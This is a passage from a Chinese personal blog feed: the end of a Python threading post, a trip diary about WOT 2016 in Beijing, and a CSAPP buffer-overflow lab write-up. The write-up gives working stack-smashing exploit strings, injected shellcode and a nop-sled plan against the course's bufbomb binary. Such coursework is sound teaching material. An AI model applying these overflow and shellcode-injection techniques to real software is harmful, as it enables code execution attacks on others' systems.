class="line">    self.integers = integers</div><div class="line">    self.event = event</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">    实现Thread的run()方法，从列表中消费整数</div><div class="line">    """</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">      self.event.wait()	<span class="comment">#等待事件被触发</span></div><div class="line">      <span class="keyword">try</span>:</div><div class="line">        integer = self.integers.pop()</div><div class="line">        <span class="keyword">print</span> <span class="string">'%d popped from list by %s'</span> % (integer, self.name)</div><div class="line">      <span class="keyword">except</span> IndexError:</div><div class="line">        <span class="comment"># catch pop on empty list</span></div><div class="line">        time.sleep(<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    integers = []</div><div class="line">    event = threading.Event()</div><div class="line">    t1 = Producer(integers, event)</div><div class="line">    t2 = Consumer(integers, event)</div><div class="line">    t1.start()</div><div class="line">    t2.start()</div><div class="line">    t1.join()</div><div class="line">    t2.join()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      在无聊的实训期间学点想学的东西，关于线程
    
    </summary>
    
    
      <category term="python" scheme="http://xinqiu.me/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>我与北京与WOT 2016</title>
    <link href="http://xinqiu.me/2016/04/15/WOT2016/"/>
    <id>http://xinqiu.me/2016/04/15/WOT2016/</id>
    <published>2016-04-14T16:00:00.000Z</published>
    <updated>2016-04-17T03:29:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>从小到大，之前都没去过北京。一是对故宫长城并没有什么兴趣(毕竟只对吃感兴趣括弧笑)，二是总觉得北京那算是大都市，自己还是太Low了。机缘巧合，得到了张WOT 2016的票，再三犹豫之后还是毅然决定踏上旅程。唉，还是准备不重复，当初还以为北京的火车票应该不是那么难买，结果就先买了去的车票，几天以后才买回程的票，结果因为买迟了，足足少在北京玩2个小时。</p>
<a id="more"></a>
<p>关于请假还是有个小插曲，感觉被书记故意刁难了。我先向班主任请假，班主任说要请示书记。书记一开始不同意，我就搞不懂了，大学生不出去走走，怎么才能了解外面的世界？然后又说去问专业老师或院长的意见。我就屁颠屁颠的去问了专业老师，专业老师觉得如果我想去就去玩玩好了，回头和书记说，却被驳回说要向院长申请。我又找专业老师，让他联系一下院长。倒是院长同意了，让我按照请假流程请假。回来请假的时候，书记又说要院长和专业老师的签字。我真的无语了，难怪我们学校信息学院这么烂，大部分老师都是认为学生这么垃圾，还是安心读书到时候大四去参加培训班之后找个外包公司安度晚年异或争取考研考公考事业编什么的。</p>
<p>第一次一个人出这么远的门，感觉爸妈都有点不是很放心。开始的紧张在脚踏北京的地上时就已经不在紧张了。感觉只要有手机，基本上就什么都不怕了。不管是买早饭还是用地图。</p>
<p>早早的来到了北京珠三角JW万豪酒店</p>
<p><img src="JW.jpg" alt=""></p>
<p>看到了广告牌</p>
<p><img src="1.jpg" alt=""></p>
<p>随后签到拿到了嘉宾牌，场外的人还挺多的。</p>
<p><img src="2.jpg" alt=""></p>
<p>第一次感受了这种氛围，大部分人都是工作的人，学生还是挺少的。大一曾经憧憬过运维这个职业，现在比较火的是DevOps。在开会之前的一段时间，我就开始闲逛时间，顺便各种关注微信公众号抽奖什么的233。一路的不少公司展区都被我搜刮了小礼品。AWS抽到的笔意外的好写。</p>
<p><img src="3.jpg" alt=""></p>
<p>这是主会场开会前每个座位上放的广告大礼包233.之后就是会议开始， 早上的是集中会议，虽然离我很遥远，但一些思想我觉得还是正确的。</p>
<p><img src="4.jpg" alt=""></p>
<p>中午在KFC用了次Apple Pay，小额免密，圆了一次绑上银行卡后一直没用的遗憾。</p>
<p>下午本来想去听C会场，结果一脸懵逼，全是人。只好去了人不是很多的B安全会场。看到了道哥，真的年轻。这些公司的PPT真的不是盖的，演讲的档次真的不一样，想到当年参加锐聘的比赛做的Keynote，简直黑历史。</p>
<p>之后因为要约一约北京的同学，就提前离开了会场。走前问了主办方才知道，原来我这个票是可以看两天的，被送票方骗了&gt; &lt;,不然就可以在北京多玩一天了。和同学吃了北京的烧烤，还挺有特色，果然每个地方的烧烤口味都是有区别的。</p>
<p><img src="5.jpg" alt=""></p>
<p><img src="6.jpg" alt=""></p>
<p>好想有机会再去北京玩玩，这次还有个遗憾是没吃炸酱面。北京之旅让我深有感触，加深了要更加努力的决心。在最近最不想学习的时候来了次北京打了针鸡血，但愿能维持长一段时间。</p>
]]></content>
    
    <summary type="html">
    
      仓促的北京之旅
    
    </summary>
    
    
      <category term="Life" scheme="http://xinqiu.me/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Lab3 解题分析</title>
    <link href="http://xinqiu.me/2016/03/30/csapp-lab3-buflab/"/>
    <id>http://xinqiu.me/2016/03/30/csapp-lab3-buflab/</id>
    <published>2016-03-29T16:00:00.000Z</published>
    <updated>2016-04-07T02:02:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>首先，使用tar xvf命令解压文件后，会有3个可执行的二进制文件bufbomb，hex2raw，makecookie。参考<a href="http://csapp.cs.cmu.edu/3e/buflab32.pdf" target="_blank" rel="external">write-up</a>。</p>
<!--toc-->
<h2 id="Level_0"><a href="#Level_0" class="headerlink" title="Level 0"></a>Level 0</h2><p>Bufbomb程序运行会读一个字符串，使用一下函数getbuf:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Buffer size for getbuf */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> NORMAL_BUFFER_SIZE 32</span></div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getbuf</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</div><div class="line">	Gets(buf);</div><div class="line">	<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Gets函数和标准库的gets功能比较相似，是读取字符串。因为Gets没有办法判断是否buf足够大，所以要用一个函数去判断长度是否小于32。将字符串传入getbuf函数中，若字符串小于32，则返回1.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">080491f4 &lt;getbuf&gt;:</div><div class="line"> 80491f4:	55                   	push   %ebp</div><div class="line"> 80491f5:	89 e5                	mov    %esp,%ebp</div><div class="line"> 80491f7:	83 ec 38             	sub    $0x38,%esp</div><div class="line"> 80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax</div><div class="line"> 80491fd:	89 04 24             	mov    %eax,(%esp)</div><div class="line"> 8049200:	e8 f5 fa ff ff       	call   8048cfa &lt;Gets&gt;</div><div class="line"> 8049205:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line"> 804920a:	c9                   	leave  </div><div class="line"> 804920b:	c3                   	ret</div></pre></td></tr></table></figure>
<p>getbuf是由函数test调用:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;   </div><div class="line">  <span class="keyword">int</span> val;   </div><div class="line">  <span class="comment">/* Put canary on stack to detect possiblecorruption */</span>   </div><div class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> local = uniqueval();   </div><div class="line">   </div><div class="line">  val = getbuf();   </div><div class="line">   </div><div class="line">  <span class="comment">/* Check for corruption stack */</span>   </div><div class="line">  <span class="keyword">if</span> (local != uniqueval()) &#123;   </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Sabotaged!: the stack has beencorrupted\n"</span>);   </div><div class="line">  &#125;   </div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie) &#123;   </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Boom!: getbuf returned0x%x\n"</span>, val);   </div><div class="line">    validate(<span class="number">3</span>);   </div><div class="line">  &#125; <span class="keyword">else</span> &#123;   </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Dud: getbuf returned0x%x\n"</span>, val);   </div><div class="line">  &#125;   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>其中，Smoke源码： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">smoke</span><span class="params">()</span></span>&#123;   </div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Smoke!: You calledsmoke()"</span>);   </div><div class="line">  validate(<span class="number">0</span>);   </div><div class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>level 0 的任务是让getbuf在执行后返回时，执行smoke函数，而不是返回test函数中。</p>
<a id="more"></a>
<p>关于堆栈，可以参考书中的这张图 <img src="stack-frame-structure.png" alt=""></p>
<p>根据上面的汇编代码，可以知道，首先push保存了堆指针(frame pointer)，然后%ebp保存帧指针(stack pointer)，%esp减0x38。lea把buf的指针地址-0x28(%ebp)传给了Gets函数。所以可以画出堆栈图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">+---------------+</div><div class="line">|               |</div><div class="line">| getbuf返回地址 |</div><div class="line">|               |</div><div class="line">+---------------+</div><div class="line">|               |</div><div class="line">|     %ebp      |</div><div class="line">|               |</div><div class="line">+---------------+</div><div class="line">|               |</div><div class="line">|               |</div><div class="line">|               |</div><div class="line">|      buf      |</div><div class="line">|               |</div><div class="line">|    40 byte    |</div><div class="line">|               |</div><div class="line">|               |</div><div class="line">|               |</div><div class="line">+---------------+</div><div class="line">|               |</div><div class="line">|     %esp      |</div><div class="line">|               |</div><div class="line">+---------------+</div></pre></td></tr></table></figure>
<p>所以为了修改getbuf返回地址，需要在从buf开始，填充 40 + 4 = 44个字节，并且按照要求，这44个字节要是非0a数。根据汇编得到的smoke地址为08048c18，又因为是电脑小端法，所以构建的文本可以是这样的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08</div></pre></td></tr></table></figure>
<h2 id="Level_1"><a href="#Level_1" class="headerlink" title="Level 1"></a>Level 1</h2><p>bufbomb中有个函数fizz:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</div><div class="line">  <span class="keyword">if</span> (val == cookie) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Fizz!: You calledfizz(0x%x)\n"</span>, val);</div><div class="line">    validate(<span class="number">1</span>);</div><div class="line"> &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Misfire: You calledfizz(0x%x)\n"</span>, val);</div><div class="line">   </div><div class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>题目要求和level 0类似，就是让程序执行fizz而不是返回test。区别就是这个fizz函数要求传入参数，而且传入的参数必须是自己的cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">08048c42 &lt;fizz&gt;:</div><div class="line"> 8048c42: 55                    push   %ebp</div><div class="line"> 8048c43: 89 e5                 mov    %esp,%ebp</div><div class="line"> 8048c45: 83 ec 18              sub    $0x18,%esp</div><div class="line"> 8048c48: 8b 45 08              mov    0x8(%ebp),%eax</div><div class="line"> 8048c4b: 3b 05 08 d1 04 08     cmp    0x804d108,%eax</div><div class="line"> 8048c51: 75 26                 jne    8048c79 &lt;fizz+0x37&gt;</div><div class="line"> 8048c53: 89 44 24 08           mov    %eax,0x8(%esp)</div><div class="line"> 8048c57: c7 44 24 04 ee a4 04  movl   $0x804a4ee,0x4(%esp)</div><div class="line"> 8048c5e: 08 </div><div class="line"> 8048c5f: c7 04 24 01 00 00 00  movl   $0x1,(%esp)</div><div class="line"> 8048c66: e8 55 fd ff ff        call   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048c6b: c7 04 24 01 00 00 00  movl   $0x1,(%esp)</div><div class="line"> 8048c72: e8 04 07 00 00        call   804937b &lt;validate&gt;</div><div class="line"> 8048c77: eb 18                 jmp    8048c91 &lt;fizz+0x4f&gt;</div><div class="line"> 8048c79: 89 44 24 08           mov    %eax,0x8(%esp)</div><div class="line"> 8048c7d: c7 44 24 04 40 a3 04  movl   $0x804a340,0x4(%esp)</div><div class="line"> 8048c84: 08 </div><div class="line"> 8048c85: c7 04 24 01 00 00 00  movl   $0x1,(%esp)</div><div class="line"> 8048c8c: e8 2f fd ff ff        call   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048c91: c7 04 24 00 00 00 00  movl   $0x0,(%esp)</div><div class="line"> 8048c98: e8 63 fc ff ff        call   8048900 &lt;exit@plt&gt;</div></pre></td></tr></table></figure>
<p>通过反汇编，可以发现变量val存在0x8(%ebp)这个位置，所以需要将0x8(%ebp)位置的值修改为cookie。首先前面的44位用非0a数填充，接着应该用fizz的地址08048c42替换原来的返回地址。然后添加4个非0a数，之后就应该添加cookie了。注意cookie也是用到小端表示。</p>
<p>所以构成了:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 42 8c 04 08 00 00 00 00 88 41 9d 21</div></pre></td></tr></table></figure>
<h2 id="Level_2"><a href="#Level_2" class="headerlink" title="Level 2"></a>Level 2</h2><p>让getbuf调用后执行bang函数，同时修改global_value。因为global_value是全局变量，所以并没储存在栈中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (global_value == cookie) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Bang!: You set global_value to 0x%x\n"</span>, global_value);</div><div class="line">        validate(<span class="number">2</span>);</div><div class="line">    &#125; <span class="keyword">else</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: global_value = 0x%x\n"</span>, global_value);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>通过反汇编:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">08048c9d &lt;bang&gt;:</div><div class="line"> 8048c9d: 55                    push   %ebp</div><div class="line"> 8048c9e: 89 e5                 mov    %esp,%ebp</div><div class="line"> 8048ca0: 83 ec 18              sub    $0x18,%esp</div><div class="line"> 8048ca3: a1 00 d1 04 08        mov    0x804d100,%eax</div><div class="line"> 8048ca8: 3b 05 08 d1 04 08     cmp    0x804d108,%eax</div><div class="line"> 8048cae: 75 26                 jne    8048cd6 &lt;bang+0x39&gt;</div><div class="line"> 8048cb0: 89 44 24 08           mov    %eax,0x8(%esp)</div><div class="line"> 8048cb4: c7 44 24 04 60 a3 04  movl   $0x804a360,0x4(%esp)</div><div class="line"> 8048cbb: 08 </div><div class="line"> 8048cbc: c7 04 24 01 00 00 00  movl   $0x1,(%esp)</div><div class="line"> 8048cc3: e8 f8 fc ff ff        call   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048cc8: c7 04 24 02 00 00 00  movl   $0x2,(%esp)</div><div class="line"> 8048ccf: e8 a7 06 00 00        call   804937b &lt;validate&gt;</div><div class="line"> 8048cd4: eb 18                 jmp    8048cee &lt;bang+0x51&gt;</div><div class="line"> 8048cd6: 89 44 24 08           mov    %eax,0x8(%esp)</div><div class="line"> 8048cda: c7 44 24 04 0c a5 04  movl   $0x804a50c,0x4(%esp)</div><div class="line"> 8048ce1: 08 </div><div class="line"> 8048ce2: c7 04 24 01 00 00 00  movl   $0x1,(%esp)</div><div class="line"> 8048ce9: e8 d2 fc ff ff        call   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048cee: c7 04 24 00 00 00 00  movl   $0x0,(%esp)</div><div class="line"> 8048cf5: e8 06 fc ff ff        call   8048900 &lt;exit@plt&gt;</div></pre></td></tr></table></figure>
<p>在gdb中先在getbuf处设置断点， 接着</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) r -u xinqiu</div></pre></td></tr></table></figure>
<p>让其继续运行到断点处。根据上述的反汇编代码，用 <code>x/i 0x804d100</code> 得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) x/i 0x804d100</div><div class="line">   0x804d100 &lt;global_value&gt;:  add    %al,(%eax)</div></pre></td></tr></table></figure>
<p>可以知道0x804d100放的是global_value。如果想执行某一个函数，那么就把该函数的入口地址入栈。所以能写出漏洞利用代码，将cookie传入全局变量的地址中，然后将bang的入口地址入栈，接着用ret运行。将以下汇编代码保存到level2.S中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">movl $0x219d4188,0x804d100</div><div class="line">pushl $0x08048c9d</div><div class="line">ret</div></pre></td></tr></table></figure>
<p>按照writeup，使用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -m32 -c level2.S</div></pre></td></tr></table></figure>
<p>编译，再用objdump反汇编</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">objdump <span class="_">-d</span> level2.o &gt; level2.d</div></pre></td></tr></table></figure>
<p>通过查看level2.d</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">level2.o:     file format elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0: c7 05 00 d1 04 08 88  movl   $0x219d4188,0x804d100</div><div class="line">   7: 41 9d 21 </div><div class="line">   a: 68 9d 8c 04 08        push   $0x8048c9d</div><div class="line">   f: c3                    ret</div></pre></td></tr></table></figure>
<p>将getbuf的返回地址改成buf的首地址运行，上一个栈的4字节改成bang函数的地址。这样当在getbuf中调用ret返回时程序会跳转到buf处上面的构造的恶意函数（指令），再通过恶意函数中的ret指令跳转原栈中bang的入口地址，再进入bang函数中执行。</p>
<p>为了得到buf的运行地址，可以使用gdb来获取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) p/x ($ebp-0x28)</div><div class="line">$1 = 0x55683168</div></pre></td></tr></table></figure>
<p>现在可以构造文本文件level2.txt,首先前40个字节中先用level2.d左边的操作码填充，剩余空位用00填充，接着用4个00覆盖保存的%ebp地址，最后将恶意函数的入口地址覆盖原来的返回地址，通过ret执行这个恶意函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c7 05 00 d1 04 08 88 41 9d 21 68 9d 8c 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 68 31 68 55</div></pre></td></tr></table></figure>
<h2 id="Level_3"><a href="#Level_3" class="headerlink" title="Level 3"></a>Level 3</h2><p>让getbuf正常返回到test函数，同时返回值为cookie。所以需要恢复被破坏的栈环境，将溢出前的正确的返回地址入栈，然后执行ret。因为getbuf的返回值在%eax寄存器中，溢出时会覆盖%ebp，所以需要进行恢复。</p>
<p>使用GDB</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) b test</div></pre></td></tr></table></figure>
<p>接着</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) r -u xinqiu</div></pre></td></tr></table></figure>
<p>通过查看pc寄存器的位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">(gdb) x/10i $pc</div><div class="line">=&gt; 0x8048dae &lt;test+4&gt;:  sub    $0x24,%esp</div><div class="line">   0x8048db1 &lt;test+7&gt;:  call   0x8048d90 &lt;uniqueval&gt;</div><div class="line">   0x8048db6 &lt;test+12&gt;: mov    %eax,-0xc(%ebp)</div><div class="line">   0x8048db9 &lt;test+15&gt;: call   0x80491f4 &lt;getbuf&gt;</div><div class="line">   0x8048dbe &lt;test+20&gt;: mov    %eax,%ebx</div><div class="line">   0x8048dc0 &lt;test+22&gt;: call   0x8048d90 &lt;uniqueval&gt;</div><div class="line">   0x8048dc5 &lt;test+27&gt;: mov    -0xc(%ebp),%edx</div><div class="line">   0x8048dc8 &lt;test+30&gt;: cmp    %edx,%eax</div><div class="line">   0x8048dca &lt;test+32&gt;: je     0x8048dda &lt;test+48&gt;</div><div class="line">   0x8048dcc &lt;test+34&gt;: movl   $0x804a388,(%esp)</div></pre></td></tr></table></figure>
<p>可以知道在getbuf函数返回后的一条指令是 <code>0x8048dbe</code>。</p>
<p>下面就是要构造攻击代码。需要将cookie传入eax寄存器，接着通过push入栈，ret返回来继续执行之后的代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov $0x219d4188,%eax</div><div class="line">push $0x08048dbe</div><div class="line">ret</div></pre></td></tr></table></figure>
<p>类似Level 2的操作，可以得到攻击文本文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">b8 88 41 9d 21 68 be 8d 04 08</div><div class="line">c3 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">c0 31 68 55</div><div class="line">68 31 68 55</div></pre></td></tr></table></figure>
<p>其中，倒数第二行是保存的ebp寄存器地址。</p>
<h2 id="Level_4"><a href="#Level_4" class="headerlink" title="Level 4"></a>Level 4</h2><p>首先通过反汇编得到:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">0804920c &lt;getbufn&gt;:</div><div class="line"> 804920c: 55                    push   %ebp</div><div class="line"> 804920d: 89 e5                 mov    %esp,%ebp</div><div class="line"> 804920f: 81 ec 18 02 00 00     sub    $0x218,%esp</div><div class="line"> 8049215: 8d 85 f8 fd ff ff     lea    -0x208(%ebp),%eax</div><div class="line"> 804921b: 89 04 24              mov    %eax,(%esp)</div><div class="line"> 804921e: e8 d7 fa ff ff        call   8048cfa &lt;Gets&gt;</div><div class="line"> 8049223: b8 01 00 00 00        mov    $0x1,%eax</div><div class="line"> 8049228: c9                    leave  </div><div class="line"> 8049229: c3                    ret    </div><div class="line"> 804922a: 90                    nop</div><div class="line"> 804922b: 90                    nop</div></pre></td></tr></table></figure>
<p>通过 p/x ($ebp-0x208) 可以知道buf的首地址为 0x55682f88，且buf为520个字节大小。因为getbufn被执行了五次，通过gdb continue 5次，每次都查看buf地址，可以得到每次的首地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x55682f88</div><div class="line">0x55682f48</div><div class="line">0x55682fe8</div><div class="line">0x55682f28</div><div class="line">0x55682f08</div></pre></td></tr></table></figure>
<p>根据testn的前一部分反汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">08048e26 &lt;testn&gt;:</div><div class="line">8048e26: 55                    push   %ebp</div><div class="line">8048e27: 89 e5                 mov    %esp,%ebp</div><div class="line">8048e29: 53                    push   %ebx</div><div class="line">8048e2a: 83 ec 24              sub    $0x24,%esp</div><div class="line">8048e2d: e8 5e ff ff ff        call   8048d90 &lt;uniqueval&gt;</div><div class="line">8048e32: 89 45 f4              mov    %eax,-0xc(%ebp)</div><div class="line">8048e35: e8 d2 03 00 00        call   804920c &lt;getbufn&gt;</div><div class="line">8048e3a: 89 c3                 mov    %eax,%ebx</div></pre></td></tr></table></figure>
<p>esp和ebp寄存器相等，所以当 push %ebx 时， 此时的 %ebp = %esp + 0x4, sub    $0x24,%esp 之后， %ebp = %esp + 0x28,这个就是%esp和%ebp每次的变化关系。此外可以知道call getbufn的下一条指令的地址为 0x8048e3a。</p>
<p>所以得出汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">lea 0x28(%esp),%ebp</div><div class="line">mov $0x219d4188,%eax</div><div class="line">push $0x8048e3a</div><div class="line">ret</div></pre></td></tr></table></figure>
<p>根据建议， buf的520个自己空间加上返回地址和ebp共528个字节，去掉返回地址和攻击的指令字节码，剩余的都用nop也就是0x90填充。也就是509个nop形成”nop sled”。</p>
